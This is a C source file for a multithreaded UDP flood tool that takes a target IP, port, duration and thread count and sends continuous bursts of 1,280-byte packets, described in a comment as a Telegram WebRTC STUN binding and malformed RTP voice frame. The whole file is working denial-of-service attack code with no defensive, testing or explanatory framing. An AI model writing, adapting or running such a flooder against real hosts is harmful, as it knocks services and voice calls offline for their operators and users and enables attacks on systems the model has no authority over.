
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

struct thread_data {
    char *ip;
    int port;
    int duration;
};

void *flood(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    int sndbuf = 8 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(data->port);
    sin.sin_addr.s_addr = inet_addr(data->ip);

    // Telegram WebRTC STUN Binding + Malformed RTP Voice Frame
    unsigned char payload[1280];
    payload[0] = 0x00; payload[1] = 0x01; payload[2] = 0x00; payload[3] = 0x00;
    payload[4] = 0x21; payload[5] = 0x12; payload[6] = 0xa4; payload[7] = 0x42;
    for (int i = 8; i < 1280; i++) payload[i] = rand() % 256;

    time_t end = time(NULL) + data->duration;
    while (time(NULL) < end) {
        for (int burst = 0; burst < 300; burst++) {
            payload[8] = rand() % 256;
            payload[9] = rand() % 256;
            payload[10] = rand() % 256;
            sendto(sock, payload, sizeof(payload), MSG_DONTWAIT, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 5) return 1;
    srand(time(NULL) ^ getpid());
    struct thread_data data;
    data.ip = argv[1];
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, &data);
    }
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }
    return 0;
}
